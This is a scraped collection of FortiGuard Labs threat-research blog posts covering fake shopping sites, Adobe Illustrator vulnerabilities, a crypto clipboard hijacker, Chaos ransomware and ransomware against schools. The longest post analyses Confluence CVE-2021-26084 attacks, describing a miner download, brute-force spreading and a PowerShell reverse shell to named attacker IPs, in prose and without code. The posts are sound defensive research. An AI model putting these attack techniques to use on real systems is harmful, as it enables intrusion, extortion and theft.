the same limited time offer of $99 USD for something that has a $379 MSRP: It is important to note that these similarities are repeated across all the sites we have identified. Additional Respected Brands All in the Same Family Finally, the About Us section for each of these sites not only contains the same verbiage, but are templated in a similar fashion, albeit with a slight difference from the MilwaukeTools.shop page: Assessment Each of these fraudulent domains is, on average, only several months old, with the oldest of them at the time of writing (Intexpool-us.com) being over 5 months old. In the screenshot below, we list the domains of other imitation retail sites FortiGuard Labs found, their similar creation dates, and their common registrar and CDN use, along with their use of a common template: Questions and Answers How is all this possible? Isn’t building a website only to have it taken down a huge waste of time? Website and ecommerce software have evolved considerably over the past decade. With the widespread usage of content management systems (CMS), where CMS and shopping carts are often bundled together with a content delivery network (CDN) by a webhost, bad actors are able to deploy ecommerce sites in record fashion. What exactly is a CDN? A CDN essentially enables the fast and efficient delivery of website content to requests from all over the world. It performs this by storing local caches of the website in various geographic locations. It does this by linking together a network of servers to deliver content as quickly and cheaply as possible. A CDN provider places servers at internet exchange points (IXPs) between different Internet providers so they can distribute content geographically closer to website visitors, allowing them to experience faster page loads. CDNs were once the realm of only large corporations. However, as the price of the CDN has come down, many webhosting providers who offer shopping carts are also providing CDN services. This has an additional advantage for cybercriminals as this also allows for the origination IP address to be hidden, meaning many websites (good and bad) often share the same IP address. Not only does this make attribution difficult, it gives a bad actor another layer of anonymity. How do People Come Across these Sites? People usually find these sites via simple keyword searches in search engines. They simply type in the specific product they are looking for and either the product shows up in the shopping tab or is promoted via keyword placement. Other routes to market include social media promotions. I and/or My Company Owns Intellectual Property that is Being Infringed? What Can I Do? Outside of consulting your own legal counsel (if you have the budget or have in-house counsel), you will have to rely on the registrars of the domain to take action. Due to the anonymity of WHOIS records, along with the anonymity of the true IP address of the bad actor due to their use of CDN, it can be very difficult to figure out who or what is behind the domain in question. Contacting the listed registrar in the WHOIS records is the best course of action, as many reputable registrars have an abuse contact form for domains violating their terms of service agreement. Do We Know Who These Threat Actors Are? Unfortunately, no. As the registrar of the domains and usage of CDN for these sites allow a high degree of anonymity, we don’t know who these scammers really are or if they are working alone or as part of a larger group. However, due to the usage of the same templates and the same modus operandi, it is highly likely that this is the work of one group. But there is also the possibility that this template may simply be being reused by multiple individuals and scammers. Dos and Don’ts Do perform due diligence and scrutinize websites for inconsistencies, such as mismatched fonts, inconsistent use of colors, changes in language usage, different prices or descriptions in various text, etc. Do check WHOIS records to see how long the domain has been in existence. Do look for typos and grammar (as most corporations hire copy editors) Do send an email to the company that you think might be being impersonated before you make a purchase. Don’t impulsively buy an item if it is super cheap. Like the old adage, if it’s too good to be true, it probably is. Don’t panic. If you feel you have been the victim of a scam, please call your credit card company right away and inform them of a potential scam. Conclusion of the Proliferation of Fake Ecommerce As the internet matures, so does software. As a result, the gap between professional vs individual ecommerce websites has shrunken considerably. An area that once was relegated to the expertise of web developers over a decade ago—the ability to build and deploy a usable (and untraceable) shopping cart as part of a counterfeit website scam—can now be easily designed by anybody with a working knowledge of content management systems (CMS). This is making it harder and harder to detect scam websites without doing some digging. In fact, someone with moderate technical knowledge can get a professional looking ecommerce site online within several hours, especially if they are using a proven template. Users are strongly cautioned to careful review any website they are unfamiliar with before making a purchase. Wherever possible, FortiGuard Labs has reached out to the trademark/intellectual property owners being infringed on as a courtesy notification. Fortinet Protections All associated URLS for these fraudulent sites have been added to the Web Filtering client. Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/fortinet-security-researcher-discovers-multiple-vulnerabilities-in-adobe-illustrator": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2021-10-29",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected platforms: Windows Impacted parties: Users of Adobe Illustrator 2021, versions 25.4.1 and earlier Impact: Multiple Vulnerabilities leading to Arbitrary Code Execution, Memory Leak and Application Denial of Service Severity level: Critical In August of 2021, I discovered and reported multiple zero-day vulnerabilities in Adobe Illustrator to Adobe, Inc. On Tuesday, October 26, 2021, Adobe released several security patches that fixed these vulnerabilities. They are identified as CVE-2021-40718, CVE-2021-40746, CVE-2021-40747, CVE-2021-40748 and CVE-2021-40749. All these vulnerabilities have similar root causes related to a single Illustrator Plugin. We suggest users apply the Adobe patches as soon as possible. Following are some details on these vulnerabilities. More information can be found on the related Fortinet Zero Day Advisory pages by clicking on the CVE links, below: CVE-2021-40718: This is a Memory Leak vulnerability that exists in the decoding of AutoCAD Drawing ‘DWG’ files in Adobe Illustrator. Specifically, the vulnerability is caused by a malformed DWG file, which causes an Out of Bounds Read memory access due to an improper bounds check. Attackers can exploit this vulnerability for unintended memory reads, potentially leading to a memory data leak. Fortinet previously released IPS signature Adobe.Illustrator.CVE-2021-40718.Memory.Leak for this specific vulnerability to proactively protect our customers. CVE-2021-40746 : This is an Arbitrary Code Execution vulnerability that exists in the decoding of AutoCAD Drawing ‘DWG’ files in Adobe Illustrator. Specifically, the vulnerability is caused by a malformed DWG file, which causes an Out of Bounds memory access due to an improper bounds check. Attackers can exploit this vulnerability to execute arbitrary code within the context of the application via a crafted DWG file. Fortinet previously released IPS signature Adobe.Illustrator.CVE-2021-40746.Arbitrary.Code.Execution for this specific vulnerability to proactively protect our customers. CVE-2021-40747 : This is a Memory Corruption vulnerability that exists in the decoding of AutoCAD Drawing ‘DWG’ files in Adobe Illustrator. Specifically, the vulnerability is caused by a malformed DWG file, which causes a NULL pointer dereference. Attackers can exploit this vulnerability with a crafted DWG file, potentially leading to an application denial of service. Fortinet previously released IPS signature Adobe.Illustrator.CVE-2021-40747.DoS for this specific vulnerability to proactively protect our customers CVE-2021-40748 : This is a Memory Corruption vulnerability that exists in the decoding of AutoCAD Drawing ‘DWG’ files in Adobe Illustrator. Specifically, the vulnerability is caused by a malformed DWG file, which causes a NULL pointer dereference. Attackers can exploit this vulnerability with a crafted DWG file, potentially leading to an application denial of service. Fortinet previously released IPS signature Adobe.Illustrator.CVE-2021-40748.DoS for this specific vulnerability to proactively protect our customers CVE-2021-40749 : This is a Memory Corruption vulnerability that exists in the decoding of AutoCAD Drawing ‘DWG’ files in Adobe Illustrator. Specifically, the vulnerability is caused by a malformed DWG file, which causes a NULL pointer dereference. Attackers can exploit this vulnerability with a crafted DWG file, potentially leading to an application denial of service. Fortinet previously released IPS signature Adobe.Illustrator.CVE-2021-40749.DoS for this specific vulnerability to proactively protect our customers. Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/black-friday-scams-are-coming-online-shoppers-should-approach-with-caution": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2021-10-28",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected Platforms : All OS Impacted Parties :   Online Shoppers Impact :                     Loss of personally identifiable information and/or money Severity Level :         Low Black Friday, one of the biggest retail spending days of the year, is fast approaching. According to Adobe Analytics , consumer spending on that day last year reached a whopping $9.03 billion dollars (21.6% Year-over-Year growth), and 2021 is expected to be even bigger. Amazon is the industry’s prime online shopping web site for consumers looking to buy goods at discounted prices on Black Friday. According to an Amazon blog , sales from Black Friday through Cyber Monday last year topped $4.8 billion worldwide (60% Year-over-Year growth). Given the popularity, volume, and money related to this event, cybercriminals would not pass up on this lucrative opportunity to fool consumers any way they can for financial gain. In this blog, we will elaborate how cybercriminals are using a fake Amazon gift card generator to steal cryptocurrency from their victims and using fake documents to lure those victims into potentially giving out their personal information, such as credentials for online shopping sites, credit card numbers, and home addresses. We also look at a similar scam preying on high interest in gaming consoles due to the global chip shortage. Nothing is More Expensive than Free Legitimate gift cards are often used online to purchase items on Amazon. FortiGuard Labs recently discovered a malicious file named Amazon Gift Tool.exe. The file was found in a zip file hosted on a publicly available file repository site. While we don’t know exactly how this tool was presented to potential victims, but criminals most likely advertised the tool as a free Amazon gift card generator. Obviously, a tool that provides free gift cards does not exist, but the hope of getting something for nothing can be hugely attractive to many people. However, once the victim executes the fake Amazon gift card generator it drops and executes a malicious winlogin.exe that monitors the victim’s clipboard. The purpose of the malware is simple. If the victim tries to add money to their anon-bitcoin wallet by copying and pasting the wallet address, the malware overwrites the victim’s wallet address on the clipboard with its own, resulting in the money potentially going to the attacker. The malicious code works as follows: As previously stated, the malware monitors the victim’s clipboard for any copy/paste operations. When the victim copies any data into the clipboard, the malware searches for three criteria: Clipboard text is 54 characters long (which is the length of a wallet address preceded by the string “bitcoincash:”) Clipboard text is not “bitcoincash:<attacker’s wallet>”because replacing the wallet address would no longer be necessary Clipboard text contains “bitcoincash:” to make sure the user is currently involved in trying to transfer Bitcoin Cash If all three of the criteria match, then the malware replaces the clipboard information with the attacker’s Bitcoin Cash wallet address. The attacker is hoping that the victim will not notice the overwritten crypto wallet address when the victim pastes it during the crypto transaction. Figure 1 shows a part of the malware code that searches the clipboard for potential cryptocurrency wallet addresses. The malware also sets different flags depending on the type of cryptocurrency it is testing for. Looking at the criteria above, we can see the malware uses flag5 to test for Bitcoin Cash. If one of the three criteria is not satisfied, the malware moves onto the next cryptocurrency target, Ethereum (flag6), and checks for: Clipboard text is 42 characters long, which is the length of an Ethereum wallet Clipboard is NOT already the attacker’s Bitcoin or Ethereum wallet Wallet address starts with“0”. This is because Ethereum wallet addresses start with “0x”. If all conditions match, the malware replaces the clipboard with the attacker’s Ethereum wallet address. Figure 2 shows some of the cryptocurrency wallets the attacker owns (Bitcoin, Ethereum, Binancecoin, Litecoin, Dogecoin, and Ripple) that it tries to replace the victim’s alt-coin wallet address with. We also found that the malicious winlogin.exe was distributed by a number of droppers with enticing names, such as Crunchyroll Breaker.exe, Netflix Tools.exe, Multi Gift Tools.exe, etc. Free generator of this sort has been around and scammed people for years. But given the market power of Amazon, this new scam is especially enticing. Consumers are eager to shop as much as they can on Black Friday as a lot of goods go on sale. Free Amazon gift cards are very attractive to those who want to spend less for the holiday season. However, be careful with what you wish for and don’t fall a victim to scams like this one. Gaming Console Phishing Another scam FortiGuard Labs recently observed is related to gaming consoles. With the ongoing global chip shortages, consumers are still having a hard time getting their hands on the next generation of gaming consoles, such as the PlayStation 5 and Xbox Series X and S systems that debuted late last year. FortiGuard Labs researchers recently identified a series of malicious PDFs online, with titles like, “how_much_do_xbox_one_cost_on_black_Friday.pdf” and “Walmart_black_Friday_ps5_pickup.pdf”. The first page of each PDF uses CAPTCHA to prove the user is a human. The Continue button on the same page does not work as expected because the user gets redirected to a web site as soon as they click the CAPTCHA checkbox. Unfortunately for us (and fortunately for the readers), the sites the user is redirected to were no longer available at the time of the investigation. However, based on Fortinet’s Webfiltering data, both sites have been used for Phishing. As such, the victim may be lured into giving out confidential information such credentials for online shopping sites, credit card numbers, and home address. Although these scams are not new, users should pay extra attention to the potential scams ahead of the Black Friday shopping spree. Black Friday Scam Season has Begun While online shopping towards Black Friday is fun and exciting, it also provides cyber criminals with ample opportunities to exploit and monetize a victim’s giving spirit and greed. If a discount or availability of a hard to find item seem too good to be true, think twice before making a purchase. Recommended Actions and Precautions Because these criminals are using phishing techniques to socially engineer and lure victims into following the steps laid out by the attacker, it is vital to address these challenges ahead of time. The most effective tool in the fight against spam and malicious email links and attachments is a secure email gateway with advanced detection and response technologies. Fortinet's Secure Email Gateway not only sees and effectively stops such threats but can be easily integrated into an organization's larger security strategy, rather than operating as a stand-alone solution, enabling organizations to deploy FortiMail as part of a complete end-to-end security solution. Organizations are also strongly encouraged to conduct ongoing training designed to educate and inform personnel about the latest phishing/spearphishing techniques and how to spot and respond to them. This should include encouraging employees to never open attachments from someone they don't know and always treat emails from unrecognized/untrusted senders with caution. Since it has been reported that many phishing and spearphishing attacks are being delivered as part of social engineering distribution mechanisms, end-users within an organization must also be made aware of the various types of attacks currently in use. This can be accomplished through regular training sessions and impromptu tests using predetermined templates originating from an organizations' internal security department. Simple user awareness training on how to spot emails with malicious attachments or links can also help prevent initial access into the network. Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio. Learn more about Fortinet’s free cybersecurity training, an initiative of Fortinet’s Training Advancement Agenda (TAA) , or about the Fortinet Network Security Expert (NSE) program, Security Academy program , and FortiVets veterans training program. Fortinet Protections Fortinet customers are already protected from this malware by FortiGuard’s AntiVirus as follows: W32/Fsysna.UC!tr MSIL/GenKryptik.EPMK!tr FortiMail users are protected against this phishing attack. Indicators of Compromise (IOCs): SHA2 D615C3B67026F7F832FCD25E81F698D5374FC92FFBC69C1EA50363B4CA457ADB 11C58EFF77974C97E2854F02E7781E0CC37423E5EB36EAE98CD4230FD6EC4FB0 Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/chaos-ransomware-variant-in-fake-minecraft-alt-list-brings-destruction": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2021-10-28",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected Platforms: Windows Impacted Parties: Japanese Minecraft Gamers Impact: Potential loss of files and money due to file encryption and destruction and paying ransom Severity Level: Medium Minecraft is one of the most popular digital games in the world. It was originally released in May 2009 by Swedish game developer Mojang Studios, which was acquired by Microsoft in 2014 for US $2.5 billion. Initially released for the Windows, Mac, and Linux platforms, the game is now available on 22 platforms including video game consoles and mobile devices, including Android and iOS. As its gaming population has steadily grown, reaching more than 140 million monthly active players in August 2021, Minecraft has never been more popular 12 years after its initial release. Evidently, cybercriminals cannot pass up the opportunity to target such a large userbase. FortiGuard Labs recently discovered a variant of the Chaos ransomware that appears to target Minecraft gamers in Japan. This variant not only encrypts certain files but also destroys others, rendering them unrecoverable. If gamers fall prey to the attack, choosing to pay the ransom may still lead to a loss of data. In this report we will take a look at how this new ransomware variant works. Ransomware Lure Being Posted to Japanese Minecraft Forums Gamers create “alt” (alternative) accounts within Minecraft for various purposes (both good and bad): they allow them to antagonize/troll other players without having their main account banned, they provide cover for an alternative in-game identity/personality, they help avoid getting their main account banned for using cheats (gaining an unfair advantage over other gamers), etc. FortiGuard Labs has discovered a variant of Chaos ransomware being hidden in a file pretending to contain a list of “Minecraft Alt” accounts that leads us to believe that the effort is to target Minecraft gamers in Japan. Even though they are often publicly available through Minecraft online forums, Alt Lists contain stolen accounts that gamers can use to do the things listed above. That’s what the threat actors behind this ransomware attack are using to lure victims to download and open the file. In this case, the file is an executable, but it uses a text icon to fool potential victims into thinking it is a text file full of compromised usernames and passwords for Minecraft. While we don’t know how this specific fake list is being distributed, it’s a safe guess that the file is being advertised on Minecraft forums for Japanese gamers. How the Executable Works Once the executable file is opened, the malware searches for files smaller than 2,117,152 bytes  on the compromised machine and encrypts them. It then appends those files with four random characters chosen from “abcdefghijklmnopqrstuvwxyz1234567890” as a file extension. But files larger than 2,117,152 bytes with specified file extensions are filled with random bytes so the victim will not be able to get those files back even if the ransom is paid. Having this destructive element changes this attack from a typical ransomware attack, and is a very troubling component. It is not known why the malware authors have chosen these file size values or why they choose to encrypt some and destroy others. But it is interesting to note that the Chaos malware was originally classified as a wiper malware with the ransomware component added later. Once the attack takes place, a dropped ReadMe.txt files ask the victim to pay a ransom in either bitcoin or pre-paid cards. The requested amount to decrypt the files is equal to 2,000 yen (approx. US $17), which is dirt cheap compared to the amounts other ransomware attacks typically demand. The ransom note does not specify which type of pre-paid card the attacker wants. All kinds of pre-paid cards (online shopping, gaming, music, mobile phone charge and online streaming services) are available in convenience stores. Japan has more than 50,000 convenience store locations selling pre-paid cards and most are open 24/7. The ransom note also states that the attacker is available only on Saturdays and apologizes for any inconvenience caused. The malware does not include code to identify the language setting of the compromised machine and the ransom note is available in Japanese only. This, combined with the formal language of the ransom note, indicates this Chaos ransomware variant specifically targets Japanese Windows users. The ransomware also deletes shadow copies from the compromised machine, which prevents the victim from being able to recover any files that had been encrypted, making it doubly destructive. FortiGuard Labs previously released a blog about shadow copy deletion carried out by ransomware. Luckily this Chaos ransomware variant does not have any code to steal data from the compromised machine. The malware also changes the desktop wallpaper, perhaps to add more pressure to the victim to pay the ransom. Conclusion - Chaos Ransomware Variant There is nothing fancy about this Chaos ransomware variant nor its infection vector. However, despite its cheap ransom demand, its ability to destroy data and render it unrecoverable makes it more than a mere prank to annoy Japanese Minecraft gamers. Ransomware is still ransomware, and in this case, the victim may not be able to get their original files back, with or without making a ransom payment. The best advice is for players to stay off suspicious gaming cheat sites and simply enjoy the game the way it was meant to be played. Fortinet Protections FortiGuard Labs has AV coverage in place for all of the malicious file samples in the report as: MSIL/Filecoder.AGP!tr.ransom Due to the ease of disruption, damage to daily operations , potential impact to the reputation of an organization, and the unwanted destruction or release of personally identifiable information (PII), etc., it is important to keep all AV and IPS signatures up to date. IOCs SHA2: 1a00c3f9173ee4c6f944e2dcebe44ca71f06455951728af06eba0f945e084907 aacce549a756cd942ee79f57625d0902ce79315f4e4bfb1381afa208599d7be5 Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/recent-attack-uses-vulnerability-on-confluence-server": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2021-10-21",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Affected platforms: Atlassian’s Confluence Impacted parties: Confluence Server or Data Center instance Impact: An OGNL injection vulnerability exists that would allow an unauthenticated user to execute arbitrary code Severity level: Critical Introduction of CVE-2021-26084 In August 2021, Atlassian published a security advisory about CVE-2021-26084 that could enable a threat actor to run arbitrary code on unpatched Confluence Server and Data Center instances. FortiGuard Labs analyzed the situation and published a Threat Signal with relevant information. After releasing the advisory, there occur massive scanning and proof-of-concept exploit code in public. We also collect a lot attacking traffic. In this blog we will analyze the payloads leveraging this vulnerability, deep dive into the attack and summarize the IOCs for these suspicious activities that may hint the network was affected by CVE-2021-26084. Overview of CVE-2021-26084 Incidents In September, we observed numerous threat actors targeting this vulnerability whose goal was to download a malicious payload that would install a backdoor or miner in a user’s network. These threats include Cryptojacking, Setag backdoor, Fileless attack that uses PowerShell in a system to execute shell without file dropped and Muhstik botnet; we will elaborate each of them in this analysis. Although there are different attack vectors for this vulnerability, all of these attacks are targeting the parameter “queryString” which is shown in following packet capture: Cryptojacking After exploiting CVE-2021-26084, it downloads init.sh from 86.105.195[.]120. The shell is a crypto miner that includes following tasks: Delete syslog Change commonly used command Stop aliyun services and apparmor Set the path for miner execution file (zzh) and itself but rename as newinit.sh Kill all other miner processes Use crontab to establish persistence Get scanning shell (is.sh) Clean the trace In the scanning shell, it will try to download a scanning tool, like Masscan, Pnscan, etc, which can be used to scan and survey IPv4 TCP network in order to discover live host to proceed the spreading. The downloader path is shown as below. It also downloads a shell that defines specific steps for the scan. First, get the login brute force tool hxx (md5: f0551696774f66ad3485445d9e3f7214) and account/password list ps (md5: a43ad8a740081f0b5a89e219fe8475a3), then scan the subnet belong to private network (172.16.0.0/12, 192.168.0.0/16, 10.0.0.0/8). This is to allow the malware to login into more devices in victim’s intranet and spread miner script (init.sh). The entire workflow can be seen below. Setag The following exploit traffic was observed from IP address 86.105.195.154 (AS 3164 Astimp IT Solution SRL). Setag, also known as BillGates or Ganiw, belongs to a well-known malware family that targets server via 1 day vulnerability. It mainly uses UDP/SYN/ICMP/DNS floods to conduct DDoS attack. But it also has various command can check its own status or control their victims. The command for dos attack or controlling their victims can be seen in following rawdata: Fileless Attack The observed packet is from 141.98.83.139 (AS 209588 Flyservers S.A.) and the main payload is b64 encoded. The decoded data is as follow: We can see that the payload is constructed and executed via PowerShell. The final execution will set “WindowStyle” to hidden and “CreateNoWindow” to True, which is to put itself out of sight. We decoded those data in the middle and replace {0} and {1} with “=” and “P”, then 2nd layer payload data It defined two functions, and one variable that contain the main exploit code. After converting the code in $sG, it will use VirtualAlloc to reserve a part of memory. Then it uses CreateThread to invoke the malicious code. So what exactly $sG is? After b64 decoding, we get about 570 bytes binary data as below: To dive deep in to this, we have to check this binary by IDA. Following the first call into loc_D6, it puts ws2_32 and move edx, 726774ch, and this is the hash value of LoadLibrary function, the detail code is as below: It is a reverse shell meterpreter shellcode that connects to exploit source 141.98.83[.]139 via tcp port 23733. Since the port now is closed, we only managed to capture the following packets. But the entire attack process only leveraged PowerShell to decode layer by layer, and uses hidden window style to hide itself. And finally, create a thread to achieve the reverse shell. Not a single file is dropped in the entire attack, which is known as fileless attack. Muhstik By exploiting CVE-2021-26084, it downloads conf2 from 149.28.85[.]17. The file will deploy and execute dk86 from 188.166.137[.]241 and ldm script. The attack scenario afterward is analyzed in this article , but we observed a different server IP and more attack source IP which is intended to spread conf2 of Muhstik. Conclusion We have been tracking this vulnerability for weeks and observing massive threat exploitation targeting Atlassian Confluence. Although the patch for CVE-2021-26084 is already released, public attacks are still undergoing. In this post, we gave detail of those attacks and illustrate how they using the payload to deliver malware, users should upgrade the system immediately and also apply Fortiguard protection to avoid the threat probing. Fortinet Protections For vulnerability CVE-2021-26084, Fortinet already release IPS signature Atlassian.Confluence.CVE-2021-26084.Remote.Code.Execution for it to proactive protect our customer. For payloads described are detected and blocked by the FortiGuard AntiVirus. The downloading URLs and attacker's IP addresses have been rated as \"Malicious Websites\" by the FortiGuard Web Filtering service. IOC Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and Services portfolio . Learn more about Fortinet’s free cybersecurity training , an initiative of Fortinet’s Training Advancement Agenda (TAA), or about the Fortinet Network Security Expert program , Security Academy program , and Veterans program . Learn more about FortiGuard Labs global threat intelligence and research and the FortiGuard Security Subscriptions and Services portfolio."
            }
        },
        {
            "https://www.fortinet.com/blog/threat-research/ransomware-impact-on-the-education-sector": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2021-10-05",
                    "source": "www.fortinet.com"
                },
                "text": "FortiGuard Labs Threat Research Report Thanks to Paolo Di Prodi, Fred Gutierrez, and Val Saengphaibul, who helped contribute to this blog. Affected platforms: All OS platforms Impacted parties: Education Sectors Impact: Potential ransomware infection, data exfiltration, system compromise in education sectors Severity level: High Several major ransomware incidents that impacted our daily lives occurred in 2021. In early May, Colonial Pipeline, the largest refined petroleum pipeline in the United States, was infected by DarkSide ransomware . The infection forced the company to shut down their pipeline as a precautionary measure while assessments were being made, leading to long lines of cars at gas stations along the East Coast. Later that same month, the REvil ransomware attacked JBS, the world’s largest meat processor, and disrupted the company’s meat productions. In July, REvil struck again, affecting customers of the managed services provider Kaseya. Attackers exploited an authentication bypass vulnerability in the Kaseya VSA (Virtual System Administrator) software, allowing attackers to distribute a malicious payload to downstream customers through hosts managed by the software. Because the prime goal of ransomware gangs is financial gain, the education sector was generally thought to be outside of bad guys’ targets. However, a report from the Federal Bureau of Investigation (FBI) has suggested otherwise. The FBI released a Flash alert on March 16 th , warning the public of the PYSA ransomware increasingly targeting education institutions in the US and UK. PYSA, also known as Mespinoza, is an abbreviation for “Protect Your System Amigo” and is thought to have a close kinship to the Vurten ransomware. PYSA was first spotted in December 2019. At that time, it added a “.locked” file extension to the files it encrypted, but it later switched to the more familiar “.pysa” file extension. PYSA’s entry points are generally attributed to three methods: spam emails, intrusion to a Windows host with RDP exposed to the internet, and brute force attacks against a central management console as well as some Active Directory (AD) accounts. Once infected, PYSA uses various tools, such as ProcDump, Mimikatz, and Advanced IP Scanner, to enable lateral movement and information reconnaissance. PYSA is double-extortion ransomware, as it steals information from the compromised machine andencrypts files, demanding money from the victim to decrypt their files and not release the stolen information to the public. The Grief ransomware hit a school district in Mississippi in May 2021. According to one public report, Grief’s leak site stated that ransomware software stole 10GB worth of data, including internal documents and personal information. Another school district in Washington state and schools in Virginia was also reportedly attacked by Grief. Grief ransomware, also known as GriefOrPay, is thought to be a rebrand of the DoppelPaymer ransomware. DoppelPaymer has been around since at least July 2019 and is a member of the BitPaymer ransomware family. While the reason behind rebranding from DoppelPaymer to Grief is not apparent, it happened after the Colonial Pipeline incident. One theory is that the rebrand was to take law enforcement’s attention away from the group. Ransomware gangs work like scam companies that change their names, logos, and registration after enough money is collected from the victims to divert unwanted attention from law enforcement. While its intrusion tactics are not yet identified, likely the Grief attack indirectly relies on spam emails as the DoppelyPaymer payload is thought to be distributed via the Dridex botnet. Another report suggests the presence of Cobalt Strike in some machines infected with Grief. Grief is also double-extortion ransomware, demanding ransom payments in Monero cryptocurrency for file decryption and not releasing harvested data. The Grief gang recently stepped their tactics up a notch. Their new ransom message threatens to erase the decryption key necessary to recover encrypted files if the victim contacts law enforcement or a professional ransom negotiator. This essentially makes Grief a wiper malware in addition to beingransomware. According to one report , ransomware attacks affected nearly 1,800 schools in the US during 2020, impacting over 1.3 million students. Ransoms during that time ranged from $10,000 to over $1 million per incident and cost educational institutions an additional $6.62 billion in downtime. While attacking universities may not result in the large sums ofransom money that can be obtained by attacking large businesses, stolen information can be used for financial gain,as many university systems include valuable research data as well as contact information and emails for governmentagencies, defense industries, pharmaceutical labs, and other private companies that leverage university researchers. We are aware that some Ransomware-as-a-Service providers have a rule that excludes their associates from targeting sectors deemed essential (gas, oil, hospitals, nuclear power plants, etc.), as well as government sectors, military, and non-profit organizations, to which most education sectors belong. However, this is not altruistic on their part. They mostly want to avoid the hammer brought down by law enforcement, which has little tolerance when these sectors are targeted. But there is no guarantee that affiliates will always abide by these rules. And given the rate at which the education sector has recently been targeted, they are clearly not exempt from ransomware attacks. FortiGuard Labs has identified at least 20 different ransomware infections targeting the education sector. Most of these infections occurred in the United States, which outnumbered the other countries by a large margin. The Pysa and Ryuk ransomware families were the most common, closely followed by Grief and Babuk ransomware. Interestingly, many notable ransomware variants, such as REvil, Blackmatter, Lockbit, DarkSide, and Ragnar Locker, were not found to be targeting schools. That may be partially explained by the policy mentioned above that some ransomware groups have imposed on affiliates, banning them from attacking specific sectors such as health and education. Harvested Email Addresses Associated with Education Sectors FortiGuard Labs also analyzed lists pulled from a OSINT source for email addresses with “.edu” in the domain name. 138,088 email addresses belonging to US educational institutions across all 50 States and territories were harvested between May and August 2021. Harvested emails are often sold on the dark web and can be used for future attacks. IPS Detection in Education Sectors IPS detection provides some interesting insights into malware prevalence. While it does not identify all ransomware in the wild, it does capture which ransomware is triggering IPS systems. The tables below show the top five IPS detections triggered between August 11 th and September 10 th , 2021, in the education sector in the US and worldwide. This data compares IPS detection trends in the US with those in the rest of the world. This unfiltered data indicates which cyberattacks targeted education sectors. The following tables below indicate the top five IPS signatures triggered inside organizations within the education sector from August 11 th to September 10 th , 2021. Note that the numbers were not filtered for unique machines, which means the actual impact could be lower. But this data still provides intelligence about how many scans and exploit attempts were made during the last 30 days against the education sector. In addition, these attacks do not necessarily mean that an attacker is targeting technology running inside an educational institution. It is simply a record of the attacks identified and blocked by IPS systems deployed inside education sector networks. NTP.Monlist.Command.DoS indicates an attempt against a Denial of Service vulnerability in the NTP service. The signature is associated with CVE-2013-5211 . Nmap.Script.Scanner indicates an attempted scan from an Nmap scripting engine scanner, which identifies what services the target system is running and performs further attacks based on its findings. SolarWinds.SUNBURST.Backdoor indicates that SUNBURST Backdoor C2 communication was detected in the network. SunBurst is a backdoor program distributed through the compromised SolarWind’s Orion IT monitoring and management software update system in late 2020. Port.Scanning detects an attempted scan by a port scanner that identifies which ports or services are available on a targeted system. Backdoor.DoublePulsar indicates either the presence of DoublePulsar malware or a scanning attempt via the RDP protocol. DoublePulsar is a backdoor trojan that was a part of the NSA leak by the Shadow Brokers group in March 2017 and was used in the WannaCry ransomware attack in May 2017. Qualys.Vulnerability.Scanner detects an attempted scan by a Qualys Vulnerability Scanner. An attacker may use the scanner to identify the targeted system's services and perform further attacks based on its findings. Nmap.Scirpt.Scanner and Port.Scanning Qualys.Vulnerability.Scanner appear to be regular offenders within the education sector. We were surprised to find that Sunburst backdoor IPS signatures also accounted for a large percentage of overall activity in the US, but further investigation revealed that most IPS detections belonged to one educational organization in the United States. However, when we investigated some of the most accessed URLs by the education sectors from August 11 th to September 10 th , 2021, Backdoor.DouplePulsar made more sense as its URLs led to variants of the Glupteba malware at the time of our analysis. Glupteba is a cross-platform trojan-type written in Golang and is primarily distributed through malicious advertisements that are injected into legitimate websites or advertising networks. Our analysis  confirmed the Glupteba variants downloaded from the URLs include a module to launch an infamous EternalBlue exploit, which was developed by U.S. National Security Agency (NSA) and was leaked by the ShadowBrokers hacking group in 2017. The exploit was subsequently used in notorious Wannacry and notPetya attacks. . The machines that contacted the  the malicious URLs may have downloaded and installed the Glupteba malware. Glupteba then exploitedEternalBlue to distribute DoublePulsar, a backdoor  implant disclosed by ShadowBrokers that enables the execution of additional malicious code. That scenario provides good explanation why 